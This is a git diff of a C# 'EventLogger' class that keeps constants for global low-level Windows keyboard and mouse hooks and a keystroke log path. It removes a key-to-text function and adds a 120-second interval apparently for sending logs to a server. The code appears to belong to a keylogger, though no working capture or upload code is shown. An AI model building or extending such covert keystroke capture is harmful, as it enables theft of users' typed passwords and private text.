@@ -1,9 +1,7 @@
-﻿using System.Configuration.Internal;
-using System.Diagnostics;
+﻿namespace EventLogger;
 
-namespace EventLogger;
-
-public static class Utils
+// This class is used to read the configuration for the EventLogger
+public static class Constants
 {
     public const int WH_KEYBOARD_LL = 13;
     public const int WH_MOUSE_LL = 14;
@@ -12,21 +10,8 @@ public static class Utils
     public const int WM_LBUTTONDOWN = 0x0201;
     public const int WM_RBUTTONDOWN = 0x0204;
     public const String PATH = @"C:\Users\nicof\Desktop\PROJECTS\logger\log.txt";
-    public static String TransformInt(int i) {
-        // function that transforms the int and return the string that will be written in the log file
-        // the function is called when the user press a key
-        String key = ((Keys) i).ToString();
-        if (key.Length == 1)
-        {
-            key = ((char) (i + 32)).ToString();
-        }
-        else
-        {
-            // the key is a special key
-            key = "[" + key + "]";
-        }
+    public const int API_INVOKE = 1000 * 120;
 
-        return key;
         // optimized on server side
         //switch (key)
         //{
@@ -60,6 +45,5 @@ public static class Utils
         //        key = "[" + key + "]";
         //        break;
         //}
-    }
-
+    
 }
